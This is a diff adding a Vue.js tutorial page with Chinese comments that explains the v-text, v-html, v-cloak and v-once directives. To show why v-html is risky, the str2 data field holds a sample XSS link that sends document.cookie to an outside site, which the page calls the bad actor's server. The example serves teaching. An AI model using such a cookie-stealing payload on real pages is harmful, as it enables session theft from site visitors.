@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <script src="../../../js/vue.js"></script>
+
+
+</head>
+
+<body>
+    <div id="app">
+        <h2>v-text指令</h2>
+        <span v-text="msg">
+            整个替换，这里写的内容页面中不会显示，因为这部分被v-text整个替换了,这就是v-text和插值语法的区别，然后v-text不会解析dom节点，不管是啥都当文本处理
+        </span>
+        <!-- 和下面的一样 -->
+        <span>{{msg}}2</span>
+        <h2>v-html</h2>
+        <h2 v-html="str2"></h2>
+        <p>点击直接跳转到坏人的服务器，并把cookie发送出去</p>
+        <h2>v-cloak</h2>
+        <div v-cloak>{{msg}}</div>
+        <p>主要是为了解决网速较慢，vue.js还未加载完时，页面中的插值语法还未渲染时，那么页面就会直接显示插值语法，知道vue创建实例，编译模板之后，dom才会被替换，这个过程是有一个闪动的，可以结合v-cloak加css就可以解决，后面不会再用到，因为使用了webpack加vue-router，此时所有的dom元素都是通过路由去挂载组件的，就不需要此指令了</p>
+        <h2>v-once</h2>
+        <p>表示定义它的元素或者组件，包括组件的所有子节点，只渲染一次，此后就当静态的内容</p>
+        <p>很少用到，当需要进一步优化性能时，才会用到</p>
+    </div>
+    <script>
+        var vm = new Vue({
+            el: '#app',
+            data: {
+                msg: '你好世界',
+                str: '<h2>哈哈哈哈哈</h2>',
+                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我兄弟</a>'
+            },
+            methods: {}
+        });
+    </script>
+    <style>
+        [v-cloak] {
+            display: none;
+        }
+    </style>
+
+</body>
+
+</html>
